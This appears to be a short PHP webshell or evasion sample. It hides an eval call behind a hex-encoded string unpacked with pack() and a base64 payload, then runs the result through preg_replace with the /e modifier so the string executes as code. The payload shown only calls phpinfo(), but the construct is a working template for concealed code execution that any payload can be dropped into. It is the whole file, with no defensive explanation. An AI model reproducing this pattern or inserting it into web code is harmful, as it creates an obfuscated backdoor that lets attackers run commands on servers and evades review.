<?php
    $subject='any_thing_you_can_write';
    $pattern="/^.*$/e";
    $payload='cGhwaW5mbygpOw==';
    $replacement=pack('H*', '406576616c286261736536345f6465636f646528')."\"$payload\"))";
    preg_replace($pattern, $replacement , $subject);
?>